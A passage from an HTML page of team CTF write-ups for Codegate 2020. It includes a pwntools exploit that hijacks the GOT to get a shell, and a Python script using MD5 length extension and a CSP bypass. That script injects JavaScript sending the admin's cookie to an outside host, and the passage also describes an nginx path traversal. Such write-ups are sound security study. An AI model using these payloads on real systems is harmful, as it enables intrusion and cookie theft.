@@ -1,0 +1,843 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Codegate CTF 2020 Preliminary</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#babyllvm">babyllvm</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#csp">csp</a>
+    
+                <a class="dropdown-item" href="#renderer">renderer</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#halffeed">halffeed</a>
+    
+                <a class="dropdown-item" href="#munch">munch</a>
+    
+                <a class="dropdown-item" href="#polynomial">polynomial</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#verifier">verifier</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                rev
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#orm-app">orm-app</a>
+    
+                <a class="dropdown-item" href="#malicious">malicious</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#babyllvm" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babyllvm</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#csp" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">csp</span>
+            </a>
+    
+<a href="#renderer" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">renderer</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#halffeed" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">halffeed</span>
+            </a>
+    
+<a href="#munch" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">munch</span>
+            </a>
+    
+<a href="#polynomial" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">polynomial</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#verifier" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">verifier</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">rev</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#orm-app" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">orm-app</span>
+            </a>
+    
+<a href="#malicious" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">malicious</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="codegate-ctf-2020-preliminary"><a class="header-link" href="#codegate-ctf-2020-preliminary"></a>Codegate CTF 2020 Preliminary</h1>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h3 id="babyllvm"><a class="header-link" href="#babyllvm"></a>Babyllvm</h3>
+<p>When rel_pos == 0, is_safe always return True. We can modify data_ptr in one block and read/write in another block to bypass bounding check getting arbitrary read/write. Leak libc address and hijack GOT to control PC and get shell.</p>
+<pre class="hljs"><code>from pwn import *
+
+<span class="hljs-meta">#r = remote(<span class="hljs-string">"localhost"</span>,4444)</span>
+r = remote(<span class="hljs-string">"58.229.240.181"</span>, <span class="hljs-number">7777</span>)
+payload = <span class="hljs-string">",[]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;"</span>
+r.sendlineafter(<span class="hljs-string">"&gt;&gt;&gt;"</span>,payload)
+r.recvrepeat(<span class="hljs-number">1</span>)
+r.<span class="hljs-built_in">send</span>(<span class="hljs-string">"\x00"</span>)
+libc = u64(r.recvuntil(<span class="hljs-string">"\x7f"</span>)[<span class="hljs-number">-6</span>:]+<span class="hljs-string">"\x00\x00"</span>) - <span class="hljs-number">0x110070</span>
+print <span class="hljs-built_in">hex</span>(libc)
+r.<span class="hljs-built_in">send</span>(p64(libc+<span class="hljs-number">0x10a38c</span>))
+r.sendlineafter(<span class="hljs-string">"&gt;&gt;&gt;"</span>,<span class="hljs-string">"&lt;-"</span>)
+r.interactive()</code></pre><h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="csp"><a class="header-link" href="#csp"></a>CSP</h3>
+<p>The objective is to steal admin&#39;s cookie. We are given the source code:</p>
+<pre class="hljs"><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Advanced <span class="hljs-keyword">Echo</span> Service&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;!-- TODO: implement form to support multiple APIs in same time --&gt;
+    &lt;form action=<span class="hljs-string">"view.php"</span> method=<span class="hljs-string">"GET"</span>&gt;
+      &lt;p&gt;API Name (Required): &lt;/p&gt;
+      &lt;input name=<span class="hljs-string">"name"</span> type=<span class="hljs-string">"text"</span> required /&gt; 
+      &lt;p&gt;API Param<span class="hljs-comment">#1 (Optional) : &lt;/p&gt;</span>
+      &lt;input name=<span class="hljs-string">"p1"</span> type=<span class="hljs-string">"text"</span> /&gt;
+      &lt;p&gt;API Param<span class="hljs-comment">#2 (Optional) : &lt;/p&gt;</span>
+      &lt;input name=<span class="hljs-string">"p2"</span> type=<span class="hljs-string">"text"</span> /&gt;
+      &lt;button type=<span class="hljs-string">"submit"</span>&gt;Submit&lt;/button&gt;
+    &lt;/form&gt;
+    &lt;br /&gt;
+    &lt;p&gt;
+      <span class="hljs-keyword">If</span> you find a bug, please &lt;a href=<span class="hljs-string">"/report.php"</span>&gt;report&lt;/a&gt;!
+    &lt;/p&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre><pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">require_once</span> <span class="hljs-string">'config.php'</span>;
+
+<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">"q"</span>]) || !<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">"sig"</span>])) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">"?"</span>);
+}
+
+$api_string = base64_decode($_GET[<span class="hljs-string">"q"</span>]);
+$sig = $_GET[<span class="hljs-string">"sig"</span>];
+
+<span class="hljs-keyword">if</span>(md5($salt.$api_string) !== $sig){
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">"??"</span>);
+}
+
+<span class="hljs-comment">//APIs Format : name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64) ...</span>
+$apis = explode(<span class="hljs-string">"|"</span>, $api_string);
+<span class="hljs-keyword">foreach</span>($apis <span class="hljs-keyword">as</span> $s) {
+    $info = explode(<span class="hljs-string">","</span>, $s);
+    <span class="hljs-keyword">if</span>(count($info) != <span class="hljs-number">3</span>)
+        <span class="hljs-keyword">continue</span>;
+    $n = base64_decode($info[<span class="hljs-number">0</span>]);
+    $p1 = base64_decode($info[<span class="hljs-number">1</span>]);
+    $p2 = base64_decode($info[<span class="hljs-number">2</span>]);
+
+    <span class="hljs-keyword">if</span> ($n === <span class="hljs-string">"header"</span>) {
+        <span class="hljs-keyword">if</span>(strlen($p1) &gt; <span class="hljs-number">10</span>)
+            <span class="hljs-keyword">continue</span>;
+        <span class="hljs-keyword">if</span>(strpos($p1.$p2, <span class="hljs-string">":"</span>) !== <span class="hljs-keyword">false</span> || strpos($p1.$p2, <span class="hljs-string">"-"</span>) !== <span class="hljs-keyword">false</span>) <span class="hljs-comment">//Don't trick...</span>
+            <span class="hljs-keyword">continue</span>;
+        header(<span class="hljs-string">"$p1: $p2"</span>);
+    }
+    <span class="hljs-keyword">elseif</span> ($n === <span class="hljs-string">"cookie"</span>) {
+        setcookie($p1, $p2);
+    }
+    <span class="hljs-keyword">elseif</span> ($n === <span class="hljs-string">"body"</span>) {
+        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/&lt;.*&gt;/"</span>, $p1))
+            <span class="hljs-keyword">continue</span>;
+        <span class="hljs-keyword">echo</span> $p1;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"\n&lt;br /&gt;\n"</span>;
+    }
+    <span class="hljs-keyword">elseif</span> ($n === <span class="hljs-string">"hello"</span>) {
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hello, World!\n"</span>;
+    }
+}</code></pre><p>Also, the CSP <code>default-src &#39;self&#39;; script-src &#39;none&#39;; base-uri &#39;none&#39;;</code> is very strict. It&#39;s too difficult to execute javascript with that constraint. Therefore, the idea here is to abuse <code>header</code> or <code>setcookie</code> to somehow strip out this CSP.</p>
+<p>But <code>header</code> here has some limitations: the key length and some chacracter like <code>:-</code> are not allowed. It&#39;s too hard to do any tricks here.</p>
+<p>Let&#39;s check <a href="https://www.php.net/manual/en/function.header.php">header()&#39;s doc</a> first.</p>
+<blockquote>
+<p> There are two special-case header calls. The first is a header that starts with the string &quot;HTTP/&quot; (case is not significant), which will be used to figure out the HTTP status code to send....</p>
+</blockquote>
+<p>That is cool, so we can probably manipulate the response code. After a few tries, we accidently found some status code (103, 123, 300 ...) will lead to no CSP at all. This is due to <a href="https://nginx.org/en/docs/http/ngx_http_headers_module.html#add_header">nginx&#39;s behavior</a>. You can see read <a href="https://twitter.com/stereotype32/status/1226316682227900416">our discussion here on twitter</a>. The community is just amazing!</p>
+<p>Next, we have to bypass the <code>preg_match(&quot;/&lt;.*&gt;/&quot;, $p1)</code> filter. This one is simple as we can inject newline before the <code>&gt;</code>.</p>
+<p>The last one is the md5 length extension attack. Since the API only provides signature for one single command, we have to extend it to  two commands (header and body). The part is done by @nkhg :)</p>
+<p>Here is the full payload. I don&#39;t know why <code>fetch</code> won&#39;t work in remote headless Chrome, so I use <code>&lt;img&gt;</code> instead.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3                                                                                                                                                                         </span>
+<span class="hljs-keyword">import</span> requests, hashlib, re, base64
+
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">import</span> hashpumpy
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b64e</span><span class="hljs-params">(s)</span>:</span>
+    <span class="hljs-keyword">return</span> base64.b64encode(s.encode()).decode()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b64d</span><span class="hljs-params">(s)</span>:</span>
+    <span class="hljs-keyword">return</span> base64.b64decode(s.encode())
+
+s = requests.session()
+
+target = <span class="hljs-string">'|'</span> + <span class="hljs-string">','</span>.join([
+    b64e(<span class="hljs-string">'header'</span>),
+    b64e(<span class="hljs-string">'HTTP/1.1'</span>),
+    b64e(<span class="hljs-string">'300'</span>),
+]) + <span class="hljs-string">'|'</span> + <span class="hljs-string">','</span>.join([
+    b64e(<span class="hljs-string">'body'</span>),
+    b64e(<span class="hljs-string">'&lt;img id="img"\n&gt;&lt;/img\n&gt;&lt;script\n&gt;document.getElementById("img").src="//255.255.255.255:13337/?"+document.cookie;&lt;/script\n&gt;'</span>),
+    b64e(<span class="hljs-string">'dontCare'</span>)
+])
+tmp = target.encode(<span class="hljs-string">'ascii'</span>)
+print(tmp)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">12</span>, <span class="hljs-number">13</span>):
+  <span class="hljs-comment">#r = hashpumpy.hashpump('f43646db31566ccb3f624f46aac80b53', ',,YQ==', tmp, i)</span>
+  r = hashpumpy.hashpump(<span class="hljs-string">'7f104404b0d414d18ab3efb831e333d7'</span>, <span class="hljs-string">',,'</span>, tmp, i)
+  t = base64.b64encode(r[<span class="hljs-number">1</span>])
+  <span class="hljs-comment">#print(t)</span>
+  <span class="hljs-comment">#print(i, r)</span>
+  p = s.get(<span class="hljs-string">'http://110.10.147.166/api.php'</span>, params=dict(sig=r[<span class="hljs-number">0</span>], q=t))
+  print(p.url)
+  <span class="hljs-keyword">if</span> p.content != <span class="hljs-string">b'??'</span>:
+    print(<span class="hljs-string">'solved!'</span>)
+    print(t, r[<span class="hljs-number">0</span>])
+    print(p.status_code)
+    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> p.headers.items():
+        print(k, <span class="hljs-string">':'</span>, v)
+    print(p.content)
+    <span class="hljs-keyword">break</span></code></pre><h4 id="train-of-thought"><a class="header-link" href="#train-of-thought"></a>Train of Thought</h4>
+<ol class="list">
+<li>Find out the most exploitable path here: <code>setcookie</code> and <code>header</code> to strip out CSP.</li>
+<li>Know that the <code>header</code> can be used to control HTTP status code by reading the document.</li>
+<li>Do some random testing (fuzzing) to see if we can manipulate the headers.</li>
+</ol>
+<h4 id="failed-attempts"><a class="header-link" href="#failed-attempts"></a>Failed Attempts</h4>
+<ol class="list">
+<li>CRLF injection: <code>header</code> seems to be vulnerable to this <a href="https://securiteam.com/unixfocus/5zp022a8aw/">in 2002</a>. In the latest PHP, both <code>setbookie</code> and <code>header</code> will filter out invalid characters.</li>
+<li>Bypass PHP length check and <code>strpos</code>: I can&#39;t come out with an approach to bypass that.</li>
+<li>DNS rebinding: Not useful when dealing with cookies because of the incorrect domains.</li>
+</ol>
+<h3 id="renderer"><a class="header-link" href="#renderer"></a>renderer</h3>
+<p>In this challenge we only have the Dockerfile. Those python and shell script are not included in the given source code.</p>
+<pre class="hljs"><code><span class="hljs-keyword">FROM</span> python:<span class="hljs-number">2.7</span>.<span class="hljs-number">16</span>
+
+<span class="hljs-keyword">ENV</span> FLAG CODEGATE2020{**DELETED**}
+
+<span class="hljs-keyword">RUN</span><span class="bash"> apt-get update
+</span><span class="hljs-keyword">RUN</span><span class="bash"> apt-get install -y nginx
+</span><span class="hljs-keyword">RUN</span><span class="bash"> pip install flask uwsgi
+</span>
+<span class="hljs-keyword">ADD</span><span class="bash"> prob_src/src /home/src
+</span><span class="hljs-keyword">ADD</span><span class="bash"> settings/nginx-flask.conf /tmp/nginx-flask.conf
+</span>
+<span class="hljs-keyword">ADD</span><span class="bash"> prob_src/static /home/static
+</span><span class="hljs-keyword">RUN</span><span class="bash"> chmod 777 /home/static
+</span>
+<span class="hljs-keyword">RUN</span><span class="bash"> mkdir /home/tickets
+</span><span class="hljs-keyword">RUN</span><span class="bash"> chmod 777 /home/tickets
+</span>
+<span class="hljs-keyword">ADD</span><span class="bash"> settings/run.sh /home/run.sh
+</span><span class="hljs-keyword">RUN</span><span class="bash"> chmod +x /home/run.sh
+</span>
+<span class="hljs-keyword">ADD</span><span class="bash"> settings/cleaner.sh /home/cleaner.sh
+</span><span class="hljs-keyword">RUN</span><span class="bash"> chmod +x /home/cleaner.sh
+</span>
+<span class="hljs-keyword">CMD</span><span class="bash"> [<span class="hljs-string">"/bin/bash"</span>, <span class="hljs-string">"/home/run.sh"</span>]</span></code></pre><p>So we need to do some obnoxious black-box tricks here :/</p>
+<p>The server is a proxy service with <code>Python-urllib/2.7</code>, based on Flask + uswgi. The can issue <code>GET</code> reuqest to an arbitrary endpoint. After some black-box fuzzing, we found an endpoint route <code>http://127.0.0.1/renderer/admin</code>. There is a link on that admin page <code>/static/img/admin.jpg</code>.</p>
+<p>However, visiting the link will get a 404 not found <strong>by nginx</strong>. This is kind of strange because by default <code>/static</code> should be handle by <a href="https://flask.palletsprojects.com/en/1.1.x/tutorial/static/">Flask itself</a>.</p>
+<p>And there is a nginx path traversal bug, which allows us to get the source of the remote server. For this bug you can read <a href="https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/">this article (in English)</a> or <a href="https://www.leavesongs.com/penetration/nginx-insecure-configuration.html#_1">this one (in Simplified Chinese)</a>. This bug requires some guessing in my opinion, so if you fail to do this, don&#39;t blame yourself. The author should attach the nginx config file in the given source code, rather than asking challenger to guess something here.</p>
+<p>It&#39;s worth to mention that this is probaby the 5th of 6th times I encounter this bug in 2019 and 2020&#39;s CTF ......</p>
+<p>We have the full sourcde code by inferring the filepath from the <code>uswgi.ini</code> and <code>run.py</code>:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, render_template_string, request, redirect, abort, Blueprint
+<span class="hljs-keyword">import</span> urllib2
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> hashlib
+
+<span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> path
+<span class="hljs-keyword">from</span> urlparse <span class="hljs-keyword">import</span> urlparse
+
+front = Blueprint(<span class="hljs-string">"renderer"</span>, __name__)
+
+<span class="hljs-meta">@front.before_request</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">()</span>:</span>
+    print(request.url)
+
+<span class="hljs-meta">@front.route("/", methods=["GET", "POST"])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">"GET"</span>:
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"index.html"</span>)
+
+    url = request.form.get(<span class="hljs-string">"url"</span>)
+    res = proxy_read(url) <span class="hljs-keyword">if</span> url <span class="hljs-keyword">else</span> <span class="hljs-keyword">False</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> res:
+        abort(<span class="hljs-number">400</span>)
+
+    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"index.html"</span>, data = res)
+
+<span class="hljs-meta">@front.route("/whatismyip", methods=["GET"])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ipcheck</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"ip.html"</span>, ip = get_ip(), real_ip = get_real_ip())
+
+<span class="hljs-meta">@front.route("/admin", methods=["GET"])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">admin_access</span><span class="hljs-params">()</span>:</span>
+    ip = get_ip()
+    rip = get_real_ip()
+
+    <span class="hljs-keyword">if</span> ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-string">"127.0.0.2"</span>]: <span class="hljs-comment">#super private ip :)</span>
+        abort(<span class="hljs-number">403</span>)
+
+    <span class="hljs-keyword">if</span> ip != rip: <span class="hljs-comment">#if use proxy</span>
+        ticket = write_log(rip)
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"admin_remote.html"</span>, ticket = ticket)
+
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">if</span> ip == <span class="hljs-string">"127.0.0.2"</span> <span class="hljs-keyword">and</span> request.args.get(<span class="hljs-string">"body"</span>):
+            ticket = write_extend_log(rip, request.args.get(<span class="hljs-string">"body"</span>))
+            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"admin_local.html"</span>, ticket = ticket)
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"admin_local.html"</span>, ticket = <span class="hljs-keyword">None</span>)
+
+<span class="hljs-meta">@front.route("/admin/ticket", methods=["GET"])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">admin_ticket</span><span class="hljs-params">()</span>:</span>
+    ip = get_ip()
+    rip = get_real_ip()
+
+    <span class="hljs-keyword">if</span> ip != rip: <span class="hljs-comment">#proxy doesn't allow to show ticket</span>
+        <span class="hljs-keyword">print</span> <span class="hljs-number">1</span>
+        abort(<span class="hljs-number">403</span>)
+    <span class="hljs-keyword">if</span> ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-string">"127.0.0.2"</span>]: <span class="hljs-comment">#only local</span>
+        <span class="hljs-keyword">print</span> <span class="hljs-number">2</span>
+        abort(<span class="hljs-number">403</span>)
+    <span class="hljs-keyword">if</span> request.headers.get(<span class="hljs-string">"User-Agent"</span>) != <span class="hljs-string">"AdminBrowser/1.337"</span>:
+        <span class="hljs-keyword">print</span> request.headers.get(<span class="hljs-string">"User-Agent"</span>)
+        abort(<span class="hljs-number">403</span>)
+
+    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">"ticket"</span>):
+        log = read_log(request.args.get(<span class="hljs-string">"ticket"</span>))
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> log:
+            <span class="hljs-keyword">print</span> <span class="hljs-number">4</span>
+            abort(<span class="hljs-number">403</span>)
+        <span class="hljs-keyword">return</span> render_template_string(log)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_ip</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">return</span> request.remote_addr
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_real_ip</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">return</span> request.headers.get(<span class="hljs-string">"X-Forwarded-For"</span>) <span class="hljs-keyword">or</span> get_ip()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">proxy_read</span><span class="hljs-params">(url)</span>:</span>
+    <span class="hljs-comment">#TODO : implement logging</span>
+
+    s = urlparse(url).scheme
+    <span class="hljs-keyword">if</span> s <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">"http"</span>, <span class="hljs-string">"https"</span>]: <span class="hljs-comment">#sjgdmfRk akfRk</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>
+
